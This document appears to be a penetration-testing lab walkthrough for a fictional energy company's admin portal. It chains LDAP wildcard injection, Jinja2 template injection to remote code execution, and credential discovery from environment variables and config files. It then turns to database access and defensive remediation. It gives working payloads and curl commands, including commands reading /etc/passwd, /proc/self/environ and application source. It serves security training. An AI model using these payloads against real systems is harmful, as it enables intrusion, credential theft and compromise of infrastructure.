    Background: The Four Techniques

    The capstone exercise requires understanding four distinct vulnerability classes. Each section below explains the theory, provides examples, and describes real-world impact. Read all four sections before starting the walkthrough. Understanding the theory makes the exploitation intuitive rather than mechanical.

    LDAP Injection

    The Lightweight Directory Access Protocol (LDAP) is a standard protocol for accessing directory services. Corporate environments use LDAP servers (Active Directory, OpenLDAP) to store user accounts, group memberships, organizational units, and authentication credentials. Web applications authenticate users by constructing LDAP queries from form input and checking whether the query returns a valid entry.

    How LDAP authentication works:

    When a user submits a login form with username s.chen and password SecurePass123, the application constructs an LDAP search filter:

    (&(uid=s.chen)(userPassword=SecurePass123))

    The & operator means AND: the query returns results only if both conditions match. The LDAP server searches the directory for an entry where uid equals s.chen AND userPassword equals SecurePass123. If exactly one entry matches, authentication succeeds.

    How LDAP injection works:

    LDAP supports wildcard characters. The asterisk * matches any value. If the application inserts user input directly into the LDAP filter without sanitization, an attacker can use * as the password:

    (&(uid=s.chen)(userPassword=*))

    The * matches any password value. The query returns the entry for s.chen regardless of the actual password, because every entry has some value in the userPassword field, and * matches all of them.

    More advanced LDAP injection payloads:

    Payload (password field) Resulting Filter Effect
    * (&(uid=s.chen)(userPassword=*)) Bypass password check
    *)(uid=*))(|(uid=* (&(uid=s.chen)(userPassword=*)(uid=*))(|(uid=*)) Return all entries
    *)(objectClass=* (&(uid=s.chen)(userPassword=*)(objectClass=*)) Match any object class

    Real-world impact:

    LDAP injection has been found in enterprise applications including:

    • Cisco Unity Connection (CVE-2024-20252)
    • Fortra GoAnywhere MFT (CVE-2024-0204)
    • Multiple healthcare and energy sector SCADA management interfaces

    Defense:

    • Use LDAP bind operations instead of search filters for authentication (bind operations pass the password to the LDAP server for verification rather than embedding it in a search query)
    • Escape special LDAP characters (*, (, ), \, NUL) in user input using a library function like ldap.filter.escape_filter_chars() in Python
    • Validate input format before constructing queries (usernames should match ^[a-zA-Z0-9._-]+$)

    Server-Side Template Injection (SSTI)

    Template engines generate dynamic content by combining a template (containing placeholders) with data. Jinja2 is a popular Python template engine used by Flask, Django (optionally), and many custom applications. When user input is inserted into a template string that gets compiled and rendered, the attacker can inject template syntax that executes arbitrary code.

    How Jinja2 templates work:

    from jinja2 import Template

# Safe: user data is passed as a variable
template = Template("Hello, {{ name }}!")
output = template.render(name=user_input)  # user_input is treated as data

# Vulnerable: user input IS the template
template = Template(f"Report for: {user_input}")  # user_input is compiled as template code
output = template.render()

    In the safe pattern, user_input is passed as a variable and never interpreted as template syntax. In the vulnerable pattern, user_input is concatenated into the template string before compilation. If user_input contains {{7*7}}, Jinja2 compiles and evaluates it, producing 49.

    SSTI detection payloads:

    Payload Expected Output Confirms
    {{7*7}} 49 Template expression evaluation
    {{7*'7'}} 7777777 String multiplication (Python-specific)
    {{'test'.upper()}} TEST Method call execution
    {{config}} Application config object Access to Flask config
    {{config.items()}} Config key-value pairs Enumerate configuration

    SSTI to Remote Code Execution (RCE):

    Jinja2 runs in a sandboxed environment that restricts direct access to Python builtins. However, the sandbox can be escaped by traversing Python's Method Resolution Order (MRO) to reach the os module:

    # Step 1: Access the string class
{{''.__class__}}
# Output: <class 'str'>

# Step 2: Access the base class (object)
{{''.__class__.__mro__}}
# Output: (<class 'str'>, <class 'object'>)

# Step 3: Access subclasses of object
{{''.__class__.__mro__[1].__subclasses__()}}
# Output: [<class 'type'>, <class 'weakref'>, ... hundreds of classes ...]

# Step 4: Find a class that imports os (e.g., warnings.catch_warnings)
# The index varies by Python version. An alternative approach uses cycler:
{{cycler.__init__.__globals__.os.popen('id').read()}}
# Output: uid=0(root) gid=0(root) groups=0(root)

    The cycler class is a Jinja2 global that provides access to Python's os module through its __init__.__globals__ dictionary. The os.popen() method executes a shell command and returns its output.

    Defense:

    • Never concatenate user input into template strings
    • Pass user data as template variables using template.render(data=user_input)
    • Use a sandboxed Jinja2 environment (jinja2.sandbox.SandboxedEnvironment) that restricts attribute access
    • Validate and sanitize user input to reject template syntax characters ({, }, %, #)

    Lateral Movement via Credential Discovery

    Once an attacker achieves code execution on a server, the next step is usually credential discovery. Applications store database credentials, API keys, and service account passwords in environment variables, configuration files, and container orchestration secrets.

    Common credential locations:

    Location Access Method Typical Contents
    Environment variables os.environ or /proc/self/environ Database URLs, API keys, secret tokens
    Configuration files /app/config.py, /etc/app/settings.ini DB credentials, LDAP bind passwords
    Docker secrets /run/secrets/* Mounted secret files
    .env files /app/.env Application configuration
    Container labels Docker API Service discovery metadata

    In Jinja2 SSTI, environment variables are accessible through multiple paths:

    # Flask config (if the app is Flask-based)
{{config.items()}}

# Direct os.environ access
{{cycler.__init__.__globals__.os.environ}}

# Process environment via /proc
{{cycler.__init__.__globals__.os.popen('cat /proc/self/environ').read()}}

# Request environment (WSGI variables)
{{request.environ}}

    PostgreSQL One-Liners

    Once database credentials are discovered, the attacker connects to the database to extract sensitive data. PostgreSQL provides the psql command-line client for direct database access.

    Common psql commands:

    # Connect and run a query
PGPASSWORD=pass psql -h hostname -U username -d database -c "SELECT * FROM table"

# Connect and get just the data (no headers/footers)
PGPASSWORD=pass psql -h hostname -U username -d database -t -c "SELECT column FROM table"

# List all tables
PGPASSWORD=pass psql -h hostname -U username -d database -c "\dt"

# Describe a table's columns
PGPASSWORD=pass psql -h hostname -U username -d database -c "\d table_name"

    The -t flag (tuples only) suppresses column headers and row count footers, returning only the data. Combined with -c (command), it provides clean output suitable for scripting.

    The PGPASSWORD environment variable passes the password without an interactive prompt. In production, .pgpass files or connection strings are preferred, but PGPASSWORD is practical for one-off queries during a penetration test.

    Tool Primer: LDAP Query Syntax

    Understanding LDAP filter syntax is essential for crafting injection payloads. LDAP filters use prefix notation with boolean operators.

    Filter operators:

    Operator Syntax Meaning
    Equality (uid=s.chen) uid equals s.chen
    Wildcard (uid=s*) uid starts with s
    AND (&(uid=s.chen)(role=admin)) Both conditions must match
    OR (\|(uid=s.chen)(uid=admin)) Either condition matches
    NOT (!(uid=guest)) uid is not guest

    Special characters that affect filter parsing:

    Character Meaning Escaped Form
    * Wildcard (matches any value) \2a
    ( Opens filter group \28
    ) Closes filter group \29
    \ Escape character \5c
    NUL Null byte \00

    When an application fails to escape these characters in user input, the attacker can modify the filter logic.

    Tool Primer: Jinja2 SSTI Payloads

    A progression of payloads from detection to exploitation:

    Detection (confirm SSTI exists):

    {{7*7}}                          -> 49
{{7*'7'}}                        -> 7777777
{{'hello'|upper}}                -> HELLO

    Information gathering (read application data):

    {{config}}                       -> Flask config object
{{config.items()}}               -> All config key-value pairs
{{request.environ}}              -> WSGI environment variables
{{self.__class__.__name__}}      -> Template class name

    Remote code execution (execute system commands):

    # Via cycler (Jinja2 global)
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Via joiner (another Jinja2 global)
{{joiner.__init__.__globals__.os.popen('whoami').read()}}

# Via namespace
{{namespace.__init__.__globals__.os.popen('ls /').read()}}

# Via lipsum (Jinja2 utility)
{{lipsum.__globals__.os.popen('cat /etc/passwd').read()}}

    Reading environment variables:

    # All environment variables as a dictionary
{{cycler.__init__.__globals__.os.environ}}

# Specific environment variable
{{cycler.__init__.__globals__.os.environ.get('DATABASE_URL')}}

    Complex command execution (chained commands):

    # Pipe commands
{{cycler.__init__.__globals__.os.popen('cat /etc/passwd | grep root').read()}}

# Multiple commands with semicolons
{{cycler.__init__.__globals__.os.popen('id; whoami; hostname').read()}}

# Database query via psql
{{cycler.__init__.__globals__.os.popen('PGPASSWORD=pass psql -h host -U user -d db -t -c "SELECT 1"').read()}}

    Phase 1: LDAP Injection - Bypassing Authentication

    The admin portal authenticates against an LDAP directory server. The login form accepts a username and password, constructs an LDAP search filter, and checks whether the filter returns a valid entry. The application does not sanitize the password field before inserting it into the LDAP filter, making it vulnerable to wildcard injection.

    Step 1: Launch the Exercise

    Navigate to the platform and launch the Admin Takeover exercise (MEG4.1). Note the target IP addresses displayed in the Active Lab View. Four containers start: the admin portal, the LDAP server, the engineering database, and the corporate database.

    Step 2: Configure Host Resolution

    Add the target hostnames to your /etc/hosts file:

    Kali - Add target hostnames to /etc/hosts

    echo "<subnet>.10  admin.meridian-energy.corp" | sudo tee -a /etc/hosts
echo "<subnet>.11  eng-db.meridian-energy.corp" | sudo tee -a /etc/hosts
echo "<subnet>.12  ldap.meridian-energy.corp" | sudo tee -a /etc/hosts
echo "<subnet>.13  db.meridian-energy.corp" | sudo tee -a /etc/hosts

    Verify connectivity to the admin portal:

    Kali - Verify connectivity to the admin portal

    curl -s -o /dev/null -w "%{http_code}" http://admin.meridian-energy.corp/

    A 200 response confirms the portal is reachable. Any other status code indicates a connectivity issue. Verify your VPN connection and /etc/hosts entries before proceeding.

    Step 3: Explore the Admin Portal Login Page

    Examine the login page to understand the authentication mechanism:

    Kali - Fetch the admin portal login page

    curl -s http://admin.meridian-energy.corp/ | head -100

    Look for the login form fields, the form action URL, and any hidden fields or JavaScript that indicate the authentication method. The form should submit to a login endpoint via POST with username and password fields.

    Examine the page for visual clues about the authentication backend. Error messages, footer text, or form labels may reference "LDAP," "Directory," or "Active Directory." These hints confirm that the authentication is LDAP-based rather than database-based.

    Step 4: Attempt Authentication with a Known Username

    Try logging in with Sarah Chen's username and an incorrect password to observe the error behavior:

    Kali - Test login with incorrect password

    curl -s -X POST http://admin.meridian-energy.corp/login \
  -d "username=s.chen&password=WrongPassword123" -v 2>&1 | tail -30

    The -v flag shows the full HTTP request and response headers. Examine the response carefully for:

    • Error messages: "Invalid credentials," "Authentication failed," or "LDAP bind error" confirm the authentication backend
    • Response codes: A 401 or 403 indicates failed authentication; a 302 redirect indicates successful authentication
    • Set-Cookie headers: A session cookie in the response headers means the server uses cookie-based sessions
    • Response body: HTML content may reveal error details, stack traces, or LDAP-specific messages

    Record the exact error message. LDAP-specific error messages (such as "LDAP authentication failed" or "Invalid DN syntax") confirm that the portal authenticates against an LDAP server and inform your injection strategy.

    Step 5: Attempt Authentication with a Nonexistent Username

    Try a username that does not exist in the LDAP directory:

    Kali - Test login with nonexistent username

    curl -s -X POST http://admin.meridian-energy.corp/login \
  -d "username=nonexistent.user&password=Test123" -v 2>&1 | tail -30

    Compare the error message to the one from Step 4. If the messages differ (e.g., "User not found" vs. "Invalid password"), the application reveals whether the username exists. Username enumeration through differing error messages is a separate vulnerability, but it confirms that s.chen is a valid account.

    Step 6: Exploit LDAP Wildcard Injection

    The LDAP search filter constructed by the application looks like:

    (&(uid=s.chen)(userPassword=USER_INPUT))

    If the application does not escape the * character, submitting * as the password produces:

    (&(uid=s.chen)(userPassword=*))

    The * wildcard matches any value in the userPassword field. Since every LDAP entry has a password value, the filter matches Sarah Chen's entry regardless of the actual password.

    Submit the injection:

    Kali - Exploit LDAP injection with wildcard password

    curl -s -c admin_cookies.txt -X POST http://admin.meridian-energy.corp/login \
  -d "username=s.chen&password=*" -v 2>&1 | tail -40

    Examine the response. A successful bypass shows:

    • A 302 redirect to the dashboard or admin page
    • A Set-Cookie header containing a session token
    • No error message in the response body

    If you see a redirect, the LDAP injection worked. The session cookie is saved in admin_cookies.txt for use in subsequent requests.

    Kali - Access the admin dashboard with session cookie

    • User Management: List, create, and modify user accounts
    • System Configuration: Network settings, service status, backup schedules
    • Report Generator: Create compliance, audit, and engineering reports
    • Logs: Authentication logs, system events, error logs

    Record all available sections and their URLs. The Report Generator is the target for Phase 2.

The configuration section may expose internal hostnames and service endpoints. The logs section may show recent authentication attempts, including your failed login from Step 4.

    Phase 2: Server-Side Template Injection (SSTI)

    The Report Generator allows administrators to create reports by entering parameters into a form. The application takes the form input and renders it using Jinja2 templates. If user input is embedded directly into the template string before rendering, the application is vulnerable to SSTI.

    Step 9: Understand the Report Generator Interface

    Examine the Report Generator form:

    Kali - Fetch the report generator form

    curl -s -b admin_cookies.txt http://admin.meridian-energy.corp/reports

    Look at the form fields. The generator likely accepts parameters like:

    • Report title: A free-text field for naming the report
    • Report type: A dropdown for selecting the report category
    • Date range: Start and end dates for the report period
    • Additional notes or description: A free-text field for custom content

    The free-text fields (title, notes, description) are the most likely injection points. The application probably concatenates these values into a Jinja2 template string before rendering.

    Step 10: Submit a Normal Report

    Generate a legitimate report to see the output format:

    Kali - Generate a normal report

    curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title=Quarterly+Compliance+Report&type=compliance&notes=Standard+quarterly+review"

    Examine the response. The rendered report should include the title and notes you submitted, formatted within a report template. Note where your input appears in the output. If the title "Quarterly Compliance Report" appears verbatim in the rendered HTML, that field is a candidate for SSTI testing.

    Step 11: Test for SSTI with a Mathematical Expression

    Inject a Jinja2 expression into the title or notes field:

    Kali - Test SSTI with mathematical expression in the title field

    curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{7*7}}&type=compliance&notes=test"

    Examine the response. If the output shows 49 where you submitted {{7*7}}, SSTI is confirmed. The application compiled your input as Jinja2 template code and evaluated the expression.

    If the title field is not vulnerable, try the notes field:

    Kali - Test SSTI in the notes field

    curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title=Test+Report&type=compliance&notes={{7*7}}"

    Again, look for 49 in the output. Whichever field renders the expression is the injection point for all subsequent payloads.

    Step 12: Confirm SSTI with String Operations

    Verify SSTI with a more definitive payload that could not result from coincidence:

    Kali - Confirm SSTI with string multiplication

    curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{7*'7'}}&type=compliance&notes=test"

    In Python (and Jinja2), 7*'7' produces the string 7777777 (the character 7 repeated seven times). If the output shows 7777777, the template engine is evaluating Python expressions, confirming full SSTI.

    Step 13: Enumerate Available Objects

    Before jumping to RCE, explore what objects and data are accessible through the template context:

    Kali - List template configuration items

    curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{config.items()}}&type=compliance&notes=test"

    The config object contains the Flask application configuration. Look for:

    • SECRET_KEY: The application's secret key used for signing sessions
    • SQLALCHEMY_DATABASE_URI: Database connection string (if using SQLAlchemy)
    • LDAP_HOST: The LDAP server hostname
    • Any custom configuration keys that reference database credentials or service endpoints

    Record every configuration item. Database connection strings and service hostnames are valuable for Phase 3.

    Kali - Read request environment variables

    curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{request.environ}}&type=compliance&notes=test"

    The request.environ dictionary contains WSGI environment variables, HTTP headers, and server information. Examine the output for internal hostnames, port numbers, and any credentials passed through environment variables.

    Step 14: Test Command Execution

    Attempt to execute a system command through the Jinja2 sandbox escape:

    Kali - Test command execution via SSTI

    curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('id').read()}}&type=compliance&notes=test"

    If the output shows uid= followed by user and group IDs (e.g., uid=0(root) gid=0(root)), you have achieved remote code execution through SSTI. The cycler object is a Jinja2 global, and its __init__.__globals__ dictionary provides access to the os module.

    Note the UID in the output. If the application runs as root (uid=0), every subsequent command executes with root privileges. If it runs as a non-root user (e.g., uid=1000(app)), commands execute with that user's permissions.

    Step 15: Explore the Server Filesystem

    Use RCE to explore the admin portal server:

    Kali - List the application directory

    curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('ls -la /app/').read()}}&type=compliance&notes=test"

    Look for configuration files, .env files, database connection modules, and deployment scripts. Common locations include:

    • /app/config.py or /app/settings.py: Application configuration
    • /app/.env: Environment-specific settings
    • /app/requirements.txt: Python dependencies (reveals framework and library versions)
    • /app/app.py or /app/main.py: Application entry point

    Kali - Read the application source code

    curl -s -b admin_cookies.txt -X POST http://admin.meridian-energy.corp/reports/generate \
  -d "title={{cycler.__init__.__globals__.os.popen('cat /app/app.py').read()}}&type=compliance&notes=test"

    Analysis Questions

    1. The LDAP injection used * as the password, which matches any value. What LDAP authentication method would prevent this attack, and why?

    Reveal Answer

    Using an LDAP bind operation instead of a search filter prevents wildcard injection. In a bind operation, the application connects to the LDAP server as the user by providing the full Distinguished Name (DN) and password to the ldap_bind() function. The LDAP server verifies the password internally rather than through a search filter. The wildcard * is not interpreted as a special character during bind. Instead, the server treats it as a literal password value and rejects it because no account has * as its actual password. The search-filter approach ((&(uid=user)(userPassword=input))) is inherently vulnerable because LDAP filter syntax includes special characters that the application must escape. The bind approach eliminates filter construction entirely.

    Additionally, input validation that rejects LDAP special characters (*, (, ), \, NUL) in username and password fields provides defense-in-depth. The Python ldap library includes ldap.filter.escape_filter_chars() for escaping, but switching to bind-based authentication is the stronger fix.

    2. The Jinja2 SSTI was exploited through cycler.__init__.__globals__.os.popen(). Explain each component of the chain and why a standard Jinja2 sandbox does not prevent it.

    Reveal Answer

    Breaking down the chain:

    • cycler: A Jinja2 global object available in all templates (used for CSS class cycling in loops)
    • __init__: The constructor method of the cycler class (a Python function object)
    • __globals__: A dictionary of all global variables in the module where __init__ was defined
    • os: The Python os module, present in __globals__ because the module imported it
    • popen('id'): Opens a subprocess and executes the shell command id
    • .read(): Reads the subprocess output as a string

    The standard Jinja2 Environment does not restrict attribute access. It renders any valid Python expression, including dunder (double-underscore) attribute traversal. The SandboxedEnvironment restricts access to certain attributes and callable types, but it must be explicitly configured. Many applications use the standard Environment for performance or convenience, leaving them vulnerable to attribute-chain traversal. Even with SandboxedEnvironment, misconfigurations in the attribute blocklist can leave exploitable paths.

    The root cause is that user input should never be compiled as template code. The fix is to pass user input as a template variable (template.render(title=user_input)) rather than embedding it in the template string itself.

    4. Meridian Energy wants to fix all four vulnerabilities. Prioritize the remediations from most to least critical and justify the ordering.

    Reveal Answer

    Priority 1: SSTI in the Report Generator (Execution)

    SSTI provides arbitrary code execution on the server. Even if all other vulnerabilities are fixed, SSTI allows reading files, executing commands, and pivoting to any reachable system. Fix: refactor the report generator to pass user input as template variables, never as template code. Deploy a SandboxedEnvironment as a defense-in-depth measure.

    Priority 2: Database Credentials in Environment Variables (Credential Access)

    Credentials in environment variables are accessible through multiple attack vectors (SSTI, SSRF, LFI via /proc/self/environ). Even if SSTI is fixed, another vulnerability that reads environment data would expose the database. Fix: use a secrets manager (HashiCorp Vault, AWS Secrets Manager) that provides short-lived, scoped credentials. Remove static passwords from environment variables.

    Priority 3: LDAP Injection (Initial Access)

    LDAP injection provides the initial authentication bypass that starts the chain. However, it is less critical than SSTI because authentication bypass without a subsequent execution vector only grants access to the dashboard (information disclosure, not system compromise). Fix: switch to LDAP bind authentication and validate/escape all user input before filter construction.

    Priority 4: Engineering Database Network Access (Lateral Movement)

    The admin portal server can reach the engineering database directly. Network segmentation that prevents the web application tier from connecting to the OT database tier would break the final step of the chain. Fix: implement firewall rules that restrict database access to authorized application servers only, and require mutual TLS for database connections.

    The justification for this ordering: prioritize fixes that provide the most impact reduction. SSTI enables the widest range of post-exploitation activity. Credential storage affects multiple attack vectors. LDAP injection is the entry point but has limited impact without the subsequent chain. Network access is the final link but requires all prior steps to exploit.

    Defensive Recommendations

    Immediate Actions (Fix Within 24 Hours)

    1. Patch the Report Generator: Refactor to use template.render(title=user_input) instead of Template(f"Report: {user_input}"). Deploy a SandboxedEnvironment as an additional safeguard.

    2. Fix LDAP Authentication: Switch from search-filter authentication to LDAP bind operations. Implement input validation that rejects LDAP special characters.

    3. Rotate Compromised Credentials: Change the engineering database password immediately. Rotate all credentials discovered during the engagement (SCADA credentials from Chapter 3, LDAP bind credentials, API tokens).

    Short-Term Actions (Fix Within 1 Week)

    1. Implement a Secrets Manager: Move database credentials from environment variables to HashiCorp Vault or equivalent. Generate scoped, time-limited credentials for each application.

    2. Deploy Network Segmentation: Place the engineering database on a separate network segment. Restrict access to authorized application servers only, using firewall rules and mutual TLS.

    3. Harden the LDAP Server: Enable LDAP over TLS (LDAPS), restrict anonymous queries, implement account lockout after failed authentication attempts.

    Long-Term Actions (Fix Within 1 Month)

    1. Web Application Firewall (WAF): Deploy a WAF in front of the admin portal that detects and blocks SSTI payloads, LDAP injection syntax, and anomalous request patterns.

    2. Security Code Review: Audit all web applications in the Meridian Energy network for SSTI, injection, and insecure credential storage. Prioritize applications that handle authentication or access OT systems.

    3. Penetration Test Cadence: Establish quarterly penetration testing with a scope that includes both IT and OT-adjacent systems. Require remediation within defined SLAs based on severity.

    4. Monitoring and Detection: Deploy logging and alerting for LDAP authentication anomalies (wildcard characters in queries), template rendering errors (stack traces from SSTI attempts), and unexpected database connections from the web tier.

    Key Takeaways

    • Vulnerability chaining transforms moderate findings into critical compromises. LDAP injection, SSTI, credential leakage, and network access are each moderate-severity issues. Chained together, they provide full database access and SCADA intelligence extraction.

    • LDAP injection through wildcard characters is trivial to exploit and trivial to prevent. The fix (bind authentication or input escaping) is well-documented and takes minutes to implement. The vulnerability persists because developers do not know it exists.

    • SSTI is one of the most dangerous web vulnerabilities. Template injection provides the same impact as remote code execution: arbitrary command execution, file access, credential theft, and lateral movement. Any application that compiles user input as template code is vulnerable.

    • Environment variables are not secrets management. Credentials in environment variables are accessible through file reads (/proc/self/environ), SSTI, SSRF, and application misconfiguration. A dedicated secrets manager limits exposure by providing scoped, time-limited credentials.

    • Lateral movement to OT databases is the real-world impact. The flag in this exercise represents SCADA controller access. In a real energy company, the same attack chain would provide the ability to read and potentially modify industrial control system configurations. The consequences range from data theft to physical infrastructure disruption.

    • Defense requires controls at every layer. No single fix prevents the complete chain. Input validation stops LDAP injection. Secure template rendering stops SSTI. Secrets management limits credential exposure. Network segmentation prevents lateral movement. Effective security implements all four.

    • Document everything during an engagement. Each phase of this exercise produced evidence (error messages, configuration data, credentials, network topology) that informed the next phase. Thorough documentation is not optional; it is the difference between a successful engagement and a dead end.
